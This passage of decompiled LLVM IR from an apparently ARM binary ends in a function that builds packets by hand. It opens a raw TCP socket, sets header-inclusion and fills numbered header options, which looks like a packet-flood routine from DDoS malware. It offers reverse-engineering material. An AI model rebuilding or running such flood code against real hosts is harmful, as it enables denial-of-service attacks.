  %v0_caa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_caa4 = load i32, i32* %ip.global-to-local, align 4
  %v4_caa4 = mul i32 %v1_caa4, 256
  %v5_caa4 = or i32 %v4_caa4, %v0_caa4
  store i32 %v5_caa4, i32* %r0.global-to-local, align 4
  %tmp118 = urem i8 %v3_ca9c, 16
  %v1_caa8 = zext i8 %tmp118 to i32
  store i32 %v0_ca0c, i32* %ip.global-to-local, align 4
  %v3_cab0 = sdiv i32 %v5_caa4, 256
  store i32 %v3_cab0, i32* %r1.global-to-local, align 4
  %v1_cab4 = or i32 %v1_caa8, 128
  store i32 %v1_cab4, i32* %r2.global-to-local, align 4
  %v1_cab8 = or i32 %v4_caa0, 16
  store i32 %v1_cab8, i32* %r3.global-to-local, align 4
  %v1_cabc = trunc i32 %v3_cab0 to i8
  %v3_cabc = add i32 %v0_ca0c, 3
  %v4_cabc = inttoptr i32 %v3_cabc to i8*
  store i8 %v1_cabc, i8* %v4_cabc, align 1
  %v0_cac0 = load i32, i32* %lr.global-to-local, align 4
  %v1_cac0 = load i32, i32* %ip.global-to-local, align 4
  %v2_cac0 = add i32 %v1_cac0, 8
  %v3_cac0 = inttoptr i32 %v2_cac0 to i32*
  store i32 %v0_cac0, i32* %v3_cac0, align 4
  %v0_cac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_cac4 = trunc i32 %v0_cac4 to i8
  %v2_cac4 = load i32, i32* %ip.global-to-local, align 4
  %v3_cac4 = add i32 %v2_cac4, 12
  %v4_cac4 = inttoptr i32 %v3_cac4 to i8*
  store i8 %v1_cac4, i8* %v4_cac4, align 1
  %v0_cac8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cac8 = trunc i32 %v0_cac8 to i8
  %v2_cac8 = load i32, i32* %ip.global-to-local, align 4
  %v3_cac8 = add i32 %v2_cac8, 13
  %v4_cac8 = inttoptr i32 %v3_cac8 to i8*
  store i8 %v1_cac8, i8* %v4_cac8, align 1
  %v0_cacc = load i32, i32* %r0.global-to-local, align 4
  %v1_cacc = trunc i32 %v0_cacc to i8
  %v2_cacc = load i32, i32* %ip.global-to-local, align 4
  %v3_cacc = add i32 %v2_cacc, 2
  %v4_cacc = inttoptr i32 %v3_cacc to i8*
  store i8 %v1_cacc, i8* %v4_cacc, align 1
  %v0_cad0 = call i32 @function_105b0()
  %v1_cad0 = trunc i32 %v0_cad0 to i8
  store i32 %v0_cad0, i32* %r0.global-to-local, align 4
  store i32 %v0_ca0c, i32* %lr.global-to-local, align 4
  store i32 %v1_c380, i32* %r1.global-to-local, align 4
  %v3_cadc = load i8, i8* %v4_ca98, align 1
  %v4_cadc = zext i8 %v3_cadc to i32
  store i32 %v1_cae0, i32* %r2.global-to-local, align 4
  %v1_cae4 = and i32 %v4_cadc, 223
  %v5_cae8 = or i32 %v1_cae4, %v4_cae8
  store i32 %v5_cae8, i32* %r3.global-to-local, align 4
  %v1_caec = trunc i32 %v5_cae8 to i8
  store i8 %v1_caec, i8* %v4_ca98, align 1
  store i32 %v1_c3a0, i32* %ip.global-to-local, align 4
  %v0_caf4 = load i32, i32* %lr.global-to-local, align 4
  %v1_caf4 = add i32 %v0_caf4, 13
  %v2_caf4 = inttoptr i32 %v1_caf4 to i8*
  %v3_caf4 = load i8, i8* %v2_caf4, align 1
  %v4_caf4 = zext i8 %v3_caf4 to i32
  store i32 %v1_caf8, i32* %r3.global-to-local, align 4
  %v1_cafc = and i32 %v4_caf4, 239
  %v5_cb00 = or i32 %v1_cafc, %v4_cb00
  store i32 %v5_cb00, i32* %r2.global-to-local, align 4
  %v1_cb04 = trunc i32 %v5_cb00 to i8
  store i8 %v1_cb04, i8* %v2_caf4, align 1
  %v0_cb08 = load i32, i32* %lr.global-to-local, align 4
  %v1_cb08 = add i32 %v0_cb08, 13
  %v2_cb08 = inttoptr i32 %v1_cb08 to i8*
  %v3_cb08 = load i8, i8* %v2_cb08, align 1
  %v4_cb08 = zext i8 %v3_cb08 to i32
  store i32 %v1_c3c0, i32* %lr.global-to-local, align 4
  store i32 %v0_ca0c, i32* %r1.global-to-local, align 4
  store i32 %v1_cb14, i32* %r2.global-to-local, align 4
  %v1_cb18 = and i32 %v4_cb08, 247
  %v5_cb1c = or i32 %v1_cb18, %v4_cb1c
  store i32 %v5_cb1c, i32* %r3.global-to-local, align 4
  %v1_cb20 = trunc i32 %v5_cb1c to i8
  store i8 %v1_cb20, i8* %v4_ca98, align 1
  store i32 %v1_c3e0, i32* %ip.global-to-local, align 4
  %v0_cb28 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb28 = add i32 %v0_cb28, 13
  %v2_cb28 = inttoptr i32 %v1_cb28 to i8*
  %v3_cb28 = load i8, i8* %v2_cb28, align 1
  %v4_cb28 = zext i8 %v3_cb28 to i32
  store i32 %v1_cb2c, i32* %r3.global-to-local, align 4
  %v1_cb30 = and i32 %v4_cb28, 251
  %v5_cb34 = or i32 %v1_cb30, %v4_cb34
  store i32 %v5_cb34, i32* %r2.global-to-local, align 4
  %v1_cb38 = trunc i32 %v5_cb34 to i8
  store i8 %v1_cb38, i8* %v2_cb28, align 1
  store i32 %v1_c400, i32* %lr.global-to-local, align 4
  %v0_cb40 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb40 = add i32 %v0_cb40, 13
  %v2_cb40 = inttoptr i32 %v1_cb40 to i8*
  %v3_cb40 = load i8, i8* %v2_cb40, align 1
  %v4_cb40 = zext i8 %v3_cb40 to i32
  store i32 %v1_cb44, i32* %r2.global-to-local, align 4
  %v1_cb48 = and i32 %v4_cb40, 253
  %v4_cb4c = or i32 %v1_cb48, %v3_cb4c
  store i32 %v4_cb4c, i32* %r3.global-to-local, align 4
  %v1_cb50 = trunc i32 %v4_cb4c to i8
  store i8 %v1_cb50, i8* %v2_cb40, align 1
  %v0_cb54 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb54 = add i32 %v0_cb54, 13
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  %v1_cb5c = and i32 %v4_cb54, 254
  %v2_cb64 = or i32 %v1_cb5c, %v1_cb60
  store i32 %v2_cb64, i32* %r3.global-to-local, align 4
  store i32 %v0_ca0c, i32* %r2.global-to-local, align 4
  %v4_cb6c = sdiv i32 %v0_cad0, 256
  store i32 %v4_cb6c, i32* %r1.global-to-local, align 4
  %v1_cb70 = trunc i32 %v2_cb64 to i8
  store i8 %v1_cb70, i8* %v4_ca98, align 1
  %v0_cb74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb74 = trunc i32 %v0_cb74 to i8
  %v2_cb74 = load i32, i32* %r2.global-to-local, align 4
  %v3_cb74 = add i32 %v2_cb74, 15
  %v4_cb74 = inttoptr i32 %v3_cb74 to i8*
  store i8 %v1_cb74, i8* %v4_cb74, align 1
  %v3_cb78 = load i32, i32* %r2.global-to-local, align 4
  %v4_cb78 = add i32 %v3_cb78, 14
  %v5_cb78 = inttoptr i32 %v4_cb78 to i8*
  store i8 %v1_cad0, i8* %v5_cb78, align 1
  store i32 %v6_c438, i32* %r1.global-to-local, align 4
  %v0_cb80 = load i32, i32* @r4, align 4
  store i32 %v0_cb80, i32* %r0.global-to-local, align 4
  %v2_cb84 = call i32 @function_10664(i32 %v0_cb80, i32 %v6_c438)
  store i32 %v2_cb84, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_cb90 = load i32, i32* @r4, align 4
  %v4_cb90 = add i32 %v2_cb90, %v6_c438
  %v5_cb90 = inttoptr i32 %v4_cb90 to i8*
  store i8 0, i8* %v5_cb90, align 1
  %v3_cb94 = load i32, i32* %stack_var_-40, align 4
  store i32 %v1_c28c, i32* %lr.global-to-local, align 4
  %v1_cb9c = add i32 %v3_cb94, 1
  store i32 %v1_cb9c, i32* %r3.global-to-local, align 4
  %v9_cba0 = icmp eq i32 %v1_cb9c, %v1_c28c
  store i1 %v9_cba0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cb9c, i32* %stack_var_-40, align 4
  %v5_cba8 = icmp slt i32 %v1_cb9c, %v1_c28c
  br i1 %v5_cba8, label %dec_label_pc_c4f4.outer, label %dec_label_pc_c6d0.preheader

; uselistorder directives
  uselistorder i32 %v1_cb9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_cad0, { 0, 2, 1 }
  uselistorder i32 %v3_cab0, { 1, 0 }
  uselistorder i32 %v0_ca74, { 1, 0, 2 }
  uselistorder i32 %v3_ca6c, { 1, 0 }
  uselistorder i32 %v0_ca0c, { 5, 6, 7, 0, 8, 1, 9, 2, 10, 3, 11, 4 }
  uselistorder i32 %v3_c984, { 1, 0 }
  uselistorder i32 %v2_c96c, { 1, 0 }
  uselistorder i32 %v3_c950, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c914, { 1, 0 }
  uselistorder i32 %v2_c8f8, { 1, 2, 3, 0 }
  uselistorder i32 %v4_c8e4, { 1, 0 }
  uselistorder i32 %v0_c8e0, { 0, 2, 1 }
  uselistorder i32 %v4_c8d0, { 1, 0 }
  uselistorder i32 %v0_c8cc, { 0, 2, 1 }
  uselistorder i32 %v8_c894, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c858, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_c830, { 1, 0 }
  uselistorder i32 %v7_c80c, { 1, 0, 2 }
  uselistorder i32 %v1_c7f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_c790, { 0, 2, 1 }
  uselistorder i32 %v0_c778, { 1, 0, 2 }
  uselistorder i32 %v3_c754, { 1, 0 }
  uselistorder i32 %v3_c734, { 3, 2, 0, 1 }
  uselistorder i32 %v2_c720, { 0, 2, 1 }
  uselistorder i32 %v1_c6e8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_c6c0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c6a8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_c620, { 1, 0 }
  uselistorder i32 %v10_c618, { 0, 2, 1, 3 }
  uselistorder i32 %v5_c664, { 1, 0 }
  uselistorder i1 %v9_c648, { 1, 0 }
  uselistorder i32 %v4_c65c, { 1, 0 }
  uselistorder i32 %v4_c658, { 1, 0 }
  uselistorder i32 %v0_c918, { 2, 0, 5, 6, 3, 1, 4 }
  uselistorder i1 %v7_c568, { 1, 0, 2 }
  uselistorder i1 %v7_c510, { 1, 0 }
  uselistorder i32 %v3_c50c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %stack_var_-336.0.ph, { 4, 5, 2, 3, 0, 1 }
  uselistorder i32 %v1_cb44, { 1, 0 }
  uselistorder i32 %v1_cb2c, { 1, 0 }
  uselistorder i32 %v1_caf8, { 1, 0 }
  uselistorder i32 %v1_c9cc, { 1, 0 }
  uselistorder i32 %v1_c590, { 1, 0 }
  uselistorder i32 %v5_c660, { 1, 0 }
  uselistorder i32 %v1_cb14, { 1, 0 }
  uselistorder i32 %v1_cae0, { 1, 0 }
  uselistorder i1 %v2_c678, { 1, 0 }
  uselistorder i32 %v1_c674, { 1, 0 }
  uselistorder i32 %v4_c670, { 2, 0, 1 }
  uselistorder i32 %v4_c654, { 1, 0 }
  uselistorder i32 %v1_c5c8, { 2, 1, 0 }
  uselistorder i1 %v9_c8c4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_c4e4, { 6, 5, 3, 4, 7, 0, 1, 2, 8 }
  uselistorder i32 %v3_c4e0, { 1, 0, 2 }
  uselistorder i32 %v3_c4dc, { 1, 0, 2 }
  uselistorder i1 %v2_c4c8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c4c4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_c4c0, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c4b4, { 1, 0 }
  uselistorder i1 %v7_c484, { 1, 0 }
  uselistorder i32 %v3_c480, { 3, 2, 5, 0, 4, 1 }
  uselistorder i32 %v3_c47c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_c468, { 2, 1, 0 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v6_c438, { 0, 5, 4, 1, 6, 8, 7, 9, 10, 3, 2 }
  uselistorder i32 %v1_c400, { 1, 0 }
  uselistorder i32 %v1_c3e0, { 1, 0 }
  uselistorder i32 %v1_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3a0, { 1, 0 }
  uselistorder i32 %v1_c380, { 1, 0 }
  uselistorder i8 %v5_c300, { 1, 0 }
  uselistorder i32 %v6_c2e0, { 1, 0 }
  uselistorder i32 %v4_c2c8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_c2b8, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 %v1_c28c, { 12, 13, 14, 6, 7, 8, 5, 9, 10, 11, 15, 4, 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 18, 16, 17 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 32, 33, 34, 35, 36, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 27, 28, 29, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 56, 55, 57, 59, 58, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 23, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 28, 24, 25, 26, 27, 30, 29, 31, 33, 32, 34, 36, 35, 38, 42, 37, 39, 41, 40, 45, 43, 44, 46, 47, 48, 51, 49, 52, 53, 50, 54, 57, 55, 56, 58, 59, 63, 60, 61, 62, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 30, 25, 26, 27, 28, 29, 31, 32, 0, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 15, 17, 0, 18, 19, 16, 20, 21, 22, 23, 24, 25 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_c824, { 1, 0 }
  uselistorder label %dec_label_pc_c710, { 1, 0 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c5e8, { 2, 1, 3, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_c524, { 1, 0 }
}

define i32 @function_cbb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_cbb4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v18_cbb4 = load i32, i32* @sb, align 4
  %v24_cbb4 = load i32, i32* @fp, align 4
  %v1_cbb8 = urem i32 %arg2, 256
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_cbd4 = urem i32 %arg4, 256
  store i32 %v1_cbd4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_cbe4 = call i32* @calloc(i32 %v1_cbb8, i32 4)
  %v4_cbe4 = ptrtoint i32* %v2_cbe4 to i32
  %v0_cbe8 = load i32, i32* @r5, align 4
  store i32 %v0_cbe8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_cbf4 = load i32, i32* @r7, align 4
  store i32 %v0_cbf4, i32* %r3.global-to-local, align 4
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v5_cbfc = inttoptr i32 %v0_cbe8 to i32*
  %v6_cbfc = call i32 @function_ad24(i32 %v0_cbf8, i32* %v5_cbfc, i32 2, i32 %v0_cbf4)
  %v1_cc08 = urem i32 %v6_cbfc, 256
  store i32 %v1_cc08, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cc14 = load i32, i32* @r5, align 4
  store i32 %v0_cc14, i32* %r1.global-to-local, align 4
  %v0_cc18 = load i32, i32* @r4, align 4
  %v5_cc1c = trunc i32 %v6_cbfc to i8
  %v6_cc20 = inttoptr i32 %v0_cc14 to i32*
  %v7_cc20 = call i32 @function_ad24(i32 %v0_cc18, i32* %v6_cc20, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_cc24 = load i32, i32* @r5, align 4
  store i32 %v0_cc24, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_cc34 = load i32, i32* @r4, align 4
  %v5_cc38 = inttoptr i32 %v0_cc24 to i32*
  %v6_cc38 = call i32 @function_ad24(i32 %v0_cc34, i32* %v5_cc38, i32 4, i32 64)
  %v1_cc40 = urem i32 %v6_cc38, 256
  store i32 %v1_cc40, i32* %ip.global-to-local, align 4
  %v0_cc44 = load i32, i32* @r5, align 4
  store i32 %v0_cc44, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_cc4c = load i32, i32* @r7, align 4
  store i32 %v0_cc4c, i32* %r3.global-to-local, align 4
  %v0_cc50 = load i32, i32* @r4, align 4
  %v5_cc54 = trunc i32 %v6_cc38 to i8
  %v6_cc58 = inttoptr i32 %v0_cc44 to i32*
  %v7_cc58 = call i32 @function_ad24(i32 %v0_cc50, i32* %v6_cc58, i32 5, i32 %v0_cc4c)
  %v1_cc64 = urem i32 %v7_cc58, 256
  store i32 %v1_cc64, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cc70 = load i32, i32* @r5, align 4
  store i32 %v0_cc70, i32* %r1.global-to-local, align 4
  %v0_cc74 = load i32, i32* @r4, align 4
  %v5_cc7c = inttoptr i32 %v0_cc70 to i32*
  %v6_cc7c = call i32 @function_ad24(i32 %v0_cc74, i32* %v5_cc7c, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_cc84 = load i32, i32* @r5, align 4
  store i32 %v0_cc84, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cc7c, i32* %sb.global-to-local, align 4
  %v0_cc94 = load i32, i32* @r4, align 4
  %v4_cc98 = inttoptr i32 %v0_cc84 to i32*
  %v5_cc98 = call i32 @function_ad24(i32 %v0_cc94, i32* %v4_cc98, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_cca4 = load i32, i32* @r5, align 4
  store i32 %v0_cca4, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ccb0 = load i32, i32* @r4, align 4
  %v5_ccb4 = inttoptr i32 %v0_cca4 to i32*
  %v6_ccb4 = call i32 @function_ad24(i32 %v0_ccb0, i32* %v5_ccb4, i32 16, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_ccc0 = load i32, i32* @r5, align 4
  store i32 %v0_ccc0, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_cccc = load i32, i32* @r4, align 4
  %v5_ccd0 = inttoptr i32 %v0_ccc0 to i32*
  %v6_ccd0 = call i32 @function_ad24(i32 %v0_cccc, i32* %v5_ccd0, i32 17, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_ccd4 = load i32, i32* @r5, align 4
  store i32 %v0_ccd4, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_cce0 = load i32, i32* @r7, align 4
  store i32 %v0_cce0, i32* %r3.global-to-local, align 4
  %v0_cce4 = load i32, i32* @r4, align 4
  %v5_cce8 = inttoptr i32 %v0_ccd4 to i32*
  %v6_cce8 = call i32 @function_ad24(i32 %v0_cce4, i32* %v5_cce8, i32 10, i32 %v0_cce0)
  %v0_ccec = load i32, i32* @r5, align 4
  store i32 %v0_ccec, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ccfc = load i32, i32* @r4, align 4
  %v5_cd00 = inttoptr i32 %v0_ccec to i32*
  %v6_cd00 = call i32 @function_ad24(i32 %v0_ccfc, i32* %v5_cd00, i32 11, i32 1)
  %v0_cd04 = load i32, i32* @r5, align 4
  store i32 %v0_cd04, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_cd10 = load i32, i32* @r7, align 4
  store i32 %v0_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r4, align 4
  %v5_cd18 = inttoptr i32 %v0_cd04 to i32*
  %v6_cd18 = call i32 @function_ad24(i32 %v0_cd14, i32* %v5_cd18, i32 12, i32 %v0_cd10)
  %v0_cd1c = load i32, i32* @r5, align 4
  store i32 %v0_cd1c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_cd28 = load i32, i32* @r7, align 4
  store i32 %v0_cd28, i32* %r3.global-to-local, align 4
  %v0_cd2c = load i32, i32* @r4, align 4
  %v5_cd30 = inttoptr i32 %v0_cd1c to i32*
  %v6_cd30 = call i32 @function_ad24(i32 %v0_cd2c, i32* %v5_cd30, i32 13, i32 %v0_cd28)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v0_cd34, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_cd40 = load i32, i32* @r7, align 4
  store i32 %v0_cd40, i32* %r3.global-to-local, align 4
  %v0_cd44 = load i32, i32* @r4, align 4
  %v5_cd48 = inttoptr i32 %v0_cd34 to i32*
  %v6_cd48 = call i32 @function_ad24(i32 %v0_cd44, i32* %v5_cd48, i32 14, i32 %v0_cd40)
  %v0_cd4c = load i32, i32* @r5, align 4
  store i32 %v0_cd4c, i32* %r1.global-to-local, align 4
  %v0_cd54 = load i32, i32* @r7, align 4
  store i32 %v0_cd54, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_cd5c = load i32, i32* @r4, align 4
  %v5_cd60 = inttoptr i32 %v0_cd4c to i32*
  %v6_cd60 = call i32 @function_ad24(i32 %v0_cd5c, i32* %v5_cd60, i32 15, i32 %v0_cd54)
  %v0_cd64 = load i32, i32* @r5, align 4
  store i32 %v0_cd64, i32* %r1.global-to-local, align 4
  %v0_cd68 = load i32, i32* @r7, align 4
  store i32 %v0_cd68, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_cd60, i32* %fp.global-to-local, align 4
  %v0_cd74 = load i32, i32* @r4, align 4
  %v4_cd78 = inttoptr i32 %v0_cd64 to i32*
  %v5_cd78 = call i32 @function_ad24(i32 %v0_cd74, i32* %v4_cd78, i32 %v0_cd68, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cd84 = load i32, i32* @r5, align 4
  store i32 %v0_cd84, i32* %r1.global-to-local, align 4
  store i32 %v5_cd78, i32* @sl, align 4
  %v0_cd8c = load i32, i32* @r4, align 4
  %v4_cd90 = inttoptr i32 %v0_cd84 to i32*
  %v5_cd90 = call i32 @function_ad24(i32 %v0_cd8c, i32* %v4_cd90, i32 1, i32 1)
  %v2_cd9c = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_cd9c, i32* %r3.global-to-local, align 4
  %v1_cda0 = urem i32 %v5_cd90, 256
  store i32 %v1_cda0, i32* %ip.global-to-local, align 4
  %v0_cda4 = load i32, i32* @r5, align 4
  store i32 %v0_cda4, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_cdac = load i32, i32* @r4, align 4
  %v5_cdb4 = inttoptr i32 %v0_cda4 to i32*
  %v6_cdb4 = call i32 @function_acb8(i32 %v0_cdac, i32* %v5_cdb4, i32 24, i32 %v2_cd9c, i32 %v1_cda0)
  %v0_cdbc = load i32, i32* @r7, align 4
  %v1_cdc0 = inttoptr i32 %v0_cdbc to i32*
  %v2_cdc0 = call i32 @time(i32* %v1_cdc0)
  %v1_cdc4 = load i32, i32* @r6, align 4
  %v2_cdc4 = add i32 %v1_cdc4, %v2_cdc0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_cdd8 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_cddc = icmp eq i32 %v3_cdd8, -1
  store i1 %v7_cddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cddc, label %dec_label_pc_d358, label %dec_label_pc_cde8

dec_label_pc_cde8:                                ; preds = %dec_label_pc_cbb4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_cdf0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_cdf0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cdf8 = load i32, i32* @r7, align 4
  store i32 %v0_cdf8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_ce04 = call i32 @setsockopt(i32 %v3_cdd8, i32 %v0_cdf8, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v7_ce08 = icmp eq i32 %v7_ce04, -1
  store i1 %v7_ce08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce08, label %dec_label_pc_d360, label %dec_label_pc_ce10

dec_label_pc_ce10:                                ; preds = %dec_label_pc_cde8
  store i32 %v1_cbb8, i32* %r3.global-to-local, align 4
  %v0_ce20 = load i32, i32* %sb.global-to-local, align 4
  %v3_ce20 = mul i32 %v0_ce20, 65536
  store i32 %v3_ce20, i32* %sb.global-to-local, align 4
  %v3_ce28 = urem i32 %v7_cc20, 65536
  store i32 %v3_ce28, i32* %ip.global-to-local, align 4
  %v3_ce2c = urem i32 %v0_ce20, 65536
  store i32 %v3_ce2c, i32* %r1.global-to-local, align 4
  %v3_ce30 = urem i32 %v5_cc98, 65536
  store i32 %v3_ce30, i32* %r2.global-to-local, align 4
  %v2_ce34 = icmp eq i32 %v1_cbb8, 0
  store i1 %v2_ce34, i1* %cpsr_z.global-to-local, align 1
  %v0_ce38 = load i32, i32* @r7, align 4
  store i32 %v0_ce38, i32* %stack_var_-40, align 4
  br i1 %v2_ce34, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce10
  %v0_ce54 = load i32, i32* @sl, align 4
  %v1_ce54 = add i32 %v0_ce54, 40
  %v1_ce68 = urem i32 %v0_ce20, 256
  %tmp72 = udiv i32 %v7_cc20, 256
  %tmp73 = udiv i32 %v1_ce54, 256
  %v1_ce84 = urem i32 %v5_cc98, 256
  %tmp74 = mul i32 %v6_ccb4, 256
  %v1_cea0 = and i32 %tmp74, 65280
  %tmp75 = udiv i32 %v6_ccb4, 256
  %v4_cea4 = urem i32 %tmp75, 256
